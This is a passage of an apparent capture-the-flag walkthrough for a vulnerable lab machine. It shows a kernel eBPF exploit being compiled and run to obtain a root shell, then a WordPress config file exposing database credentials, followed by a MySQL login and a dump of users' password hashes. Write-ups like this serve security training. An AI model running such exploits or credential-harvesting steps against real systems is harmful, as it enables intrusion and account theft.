+                doubleput.c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%&nbsp;4188&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;7.6MB<span style="color:#ff9d00;font-weight:700">/</span>s&nbsp;&nbsp;&nbsp;00<span style="color:#ff9d00;font-weight:700">:</span>00&nbsp;&nbsp;
+            </div>
+        </div><br>
+        <br>
+        and on SHayslett compile and run it.<br>
+            <div class="codebox">
+                SHayslett@red<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;ebpf_mapfd_doubleput_exploit<span style="color:#ff9d00;font-weight:700">/</span><br>
+                SHayslett@red<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ebpf_mapfd_doubleput_exploit$&nbsp;.<span style="color:#ff9d00;font-weight:700">/</span>compile.sh<br>
+                doubleput.c<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;In&nbsp;<span style="color:#ff9d00;font-weight:700">function</span>&nbsp;‘make_setuid’<span style="color:#ff9d00;font-weight:700">:</span><br>
+                doubleput.c<span style="color:#ff9d00;font-weight:700">:</span>91<span style="color:#ff9d00;font-weight:700">:</span>13<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;warning<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;cast&nbsp;from&nbsp;pointer&nbsp;to&nbsp;integer&nbsp;of&nbsp;different&nbsp;size&nbsp;[-Wpointer-to-int-cast]<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;.insns&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>__aligned_u64<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;insns,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;^<br>
+                doubleput.c<span style="color:#ff9d00;font-weight:700">:</span>92<span style="color:#ff9d00;font-weight:700">:</span>15<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;warning<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;cast&nbsp;from&nbsp;pointer&nbsp;to&nbsp;integer&nbsp;of&nbsp;different&nbsp;size&nbsp;[-Wpointer-to-int-cast]<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;.license&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>__aligned_u64<span style="color:#ff9d00;font-weight:700">)</span><span style="color:#3ad900;font-weight:400">""</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;^<br>
+                SHayslett@red<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ebpf_mapfd_doubleput_exploit$&nbsp;.<span style="color:#ff9d00;font-weight:700">/</span>doubleput<br>
+                starting&nbsp;writev<br>
+                woohoo,&nbsp;got&nbsp;pointer&nbsp;reuse<br>
+                writev&nbsp;returned&nbsp;successfully.&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;this&nbsp;worked,&nbsp;youll&nbsp;have&nbsp;a&nbsp;root&nbsp;shell&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;&lt;=60&nbsp;seconds.<br>
+                suid&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;detected,&nbsp;launching&nbsp;rootshell...<br>
+                we&nbsp;have&nbsp;root&nbsp;privs&nbsp;now...<br>
+                root@red<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ebpf_mapfd_doubleput_exploit#&nbsp;<span style="color:#ff9d00;font-weight:700">id</span><br>
+                <span style="color:#7f0044;font-weight:400">uid</span>=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;gid=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>,1005<span style="color:#ff9d00;font-weight:700">(</span>SHayslett<span style="color:#ff9d00;font-weight:700">)</span>
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-6" name="h3-6"></a><strong></strong>
+        <h3><strong>Rabbit hole #5 - wp-config to mysql to hashcat to nowhere</strong></h3><br>
+        I was on a hunt for peter's password because he had sudo rights. I remembered the wordpress config backup from kathy's samba share, so went looking for it now that I had a shell on the system. It had mysql login credentials.<br>
+            <div class="codebox">
+                SHayslett@red<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>https<span style="color:#ff9d00;font-weight:700">/</span>blogblog<span style="color:#ff9d00;font-weight:700">/</span>wp-config.php<br>
+                ...<br>
+                <span style="color:#ff9d00;font-weight:700">//</span>&nbsp;**&nbsp;MySQL&nbsp;settings&nbsp;-&nbsp;You&nbsp;can&nbsp;get&nbsp;this&nbsp;<span style="color:#ff9d00;font-weight:700">info</span>&nbsp;from&nbsp;your&nbsp;web&nbsp;host&nbsp;**&nbsp;<span style="color:#ff9d00;font-weight:700">//</span><br>
+                <span style="color:#ff9d00;font-weight:700">/</span>**&nbsp;The&nbsp;name&nbsp;of&nbsp;the&nbsp;database&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">WordPress</span>&nbsp;*/<br>
+                define('DB_NAME',&nbsp;'wordpress');<br>
+                <br>
+                /**&nbsp;MySQL&nbsp;database&nbsp;username&nbsp;*/<br>
+                define('DB_USER',&nbsp;'root');<br>
+                <br>
+                /**&nbsp;MySQL&nbsp;database&nbsp;password&nbsp;*/<br>
+                define('DB_PASSWORD',&nbsp;'plbkac');<br>
+                <br>
+                /**&nbsp;MySQL&nbsp;hostname&nbsp;*/<br>
+                define('DB_HOST',&nbsp;'localhost');<br>
+                <br>
+                /**&nbsp;Database&nbsp;Charset&nbsp;to&nbsp;use&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;creating&nbsp;database&nbsp;tables.&nbsp;*<span style="color:#ff9d00;font-weight:700">/</span><br>
+                define<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'DB_CHARSET'</span>,&nbsp;<span style="color:#3ad900;font-weight:400">'utf8mb4'</span><span style="color:#ff9d00;font-weight:700">);</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">/</span>**&nbsp;The&nbsp;Database&nbsp;Collate&nbsp;type.&nbsp;Don<span style="color:#3ad900;font-weight:400">'t&nbsp;change&nbsp;this&nbsp;if&nbsp;in&nbsp;doubt.&nbsp;*/<br>
+                define('</span>DB_COLLATE<span style="color:#3ad900;font-weight:400">',&nbsp;'');<br>
+                ...</span>
+            </div>
+        </div><br>
+        <br>
+        I logged into mysql and had a look for usernames and passwords<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>stapler1<span style="color:#ff9d00;font-weight:700">/</span>3306mysql#&nbsp;mysql&nbsp;-u&nbsp;root&nbsp;-p&nbsp;-h&nbsp;192.168.1.237<br>
+                Enter&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;plbkac<br>
+                Welcome&nbsp;to&nbsp;the&nbsp;MariaDB&nbsp;monitor.&nbsp;&nbsp;Commands&nbsp;end&nbsp;with&nbsp;<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;or&nbsp;<span style="color:#333333;font-weight:400">\g</span>.<br>
+                Your&nbsp;MySQL&nbsp;connection&nbsp;<span style="color:#ff9d00;font-weight:700">id</span>&nbsp;is&nbsp;230<br>
+                Server&nbsp;version<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;5.7.12-0ubuntu1&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Ubuntu<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <br>
+                Copyright&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>c<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;2000,&nbsp;2018,&nbsp;Oracle,&nbsp;MariaDB&nbsp;Corporation&nbsp;Ab&nbsp;and&nbsp;others.<br>
+                <br>
+                Type&nbsp;<span style="color:#3ad900;font-weight:400">'help;'</span>&nbsp;or&nbsp;<span style="color:#3ad900;font-weight:400">'\h'</span>&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">help</span>.&nbsp;Type&nbsp;'\c'&nbsp;to&nbsp;clear&nbsp;the&nbsp;current&nbsp;input&nbsp;statement.<br>
+                <br>
+                MySQL&nbsp;[(none)]&gt;&nbsp;use&nbsp;wordpress;<br>
+                Reading&nbsp;table&nbsp;information&nbsp;for&nbsp;completion&nbsp;of&nbsp;table&nbsp;and&nbsp;column&nbsp;names<br>
+                You&nbsp;can&nbsp;turn&nbsp;off&nbsp;this&nbsp;feature&nbsp;to&nbsp;get&nbsp;a&nbsp;quicker&nbsp;startup&nbsp;with&nbsp;-A<br>
+                <br>
+                Database&nbsp;changed<br>
+                MySQL&nbsp;[wordpress]&gt;&nbsp;select&nbsp;*&nbsp;from&nbsp;wp-users;<br>
+                ERROR&nbsp;1064&nbsp;(42000):&nbsp;You&nbsp;have&nbsp;an&nbsp;error&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;your&nbsp;SQL&nbsp;syntax<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;check&nbsp;the&nbsp;manual&nbsp;that&nbsp;corresponds&nbsp;to&nbsp;your&nbsp;MySQL&nbsp;server&nbsp;version&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">the</span>&nbsp;right&nbsp;syntax&nbsp;to&nbsp;use&nbsp;near&nbsp;'-users'&nbsp;at&nbsp;line&nbsp;1<br>
+                MySQL&nbsp;[wordpress]&gt;&nbsp;show&nbsp;tables;<br>
+                +-----------------------+<br>
+                |&nbsp;Tables_in_wordpress&nbsp;&nbsp;&nbsp;|<br>
+                +-----------------------+<br>
+                |&nbsp;wp_commentmeta&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
+                |&nbsp;wp_comments&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
+                |&nbsp;wp_links&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
+                |&nbsp;wp_options&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
+                |&nbsp;wp_postmeta&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
+                |&nbsp;wp_posts&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
+                |&nbsp;wp_term_relationships&nbsp;|<br>
+                |&nbsp;wp_term_taxonomy&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
+                |&nbsp;wp_terms&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
+                |&nbsp;wp_usermeta&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
+                |&nbsp;wp_users&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
+                +-----------------------+<br>
+                11&nbsp;rows&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">set</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>0.00&nbsp;sec<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <br>
+                MySQL&nbsp;[wordpress]&gt;&nbsp;show&nbsp;fields&nbsp;from&nbsp;wp_users<span style="color:#ff9d00;font-weight:700">;</span><br>
+                +---------------------+---------------------+------+-----+---------------------+----------------+<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Field&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Type&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Null&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Key&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Default&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Extra&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                +---------------------+---------------------+------+-----+---------------------+----------------+<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;ID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;bigint<span style="color:#ff9d00;font-weight:700">(</span>20<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;unsigned&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;NO&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;PRI&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;NULL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;auto_increment&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;user_login&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;varchar<span style="color:#ff9d00;font-weight:700">(</span>60<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;NO&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;MUL&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;user_pass&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;varchar<span style="color:#ff9d00;font-weight:700">(</span>64<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;NO&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;user_nicename&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;varchar<span style="color:#ff9d00;font-weight:700">(</span>50<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;NO&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;MUL&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;user_email&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;varchar<span style="color:#ff9d00;font-weight:700">(</span>100<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;NO&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;user_url&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;varchar<span style="color:#ff9d00;font-weight:700">(</span>100<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;NO&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;user_registered&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;datetime&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;NO&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;0000-00-00&nbsp;00<span style="color:#ff9d00;font-weight:700">:</span>00<span style="color:#ff9d00;font-weight:700">:</span>00&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;user_activation_key&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;varchar<span style="color:#ff9d00;font-weight:700">(</span>60<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;NO&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;user_status&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;int<span style="color:#ff9d00;font-weight:700">(</span>11<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;NO&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;display_name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;varchar<span style="color:#ff9d00;font-weight:700">(</span>250<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;NO&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                +---------------------+---------------------+------+-----+---------------------+----------------+<br>
+                10&nbsp;rows&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">set</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>0.00&nbsp;sec<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <br>
+                MySQL&nbsp;[wordpress]&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">select</span>&nbsp;user_login,&nbsp;user_pass&nbsp;from&nbsp;wp_users<span style="color:#ff9d00;font-weight:700">;</span><br>
+                +------------+------------------------------------+<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;user_login&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;user_pass&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                +------------+------------------------------------+<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;John&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#7f0044;font-weight:400">$P$B7889EMq</span><span style="color:#ff9d00;font-weight:700">/</span>erHIuZapMB8GEizebcIy9.&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Elly&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#7f0044;font-weight:400">$P$BlumbJRRBit7y50Y17</span>.UPJ<span style="color:#ff9d00;font-weight:700">/</span>xEgv4my0&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Peter&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#7f0044;font-weight:400">$P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0</span>&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;barry&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#7f0044;font-weight:400">$P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0</span>&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;heather&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#7f0044;font-weight:400">$P$Bwd0VpK8hX4aN</span>.rZ14WDdhEIGeJgf10&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
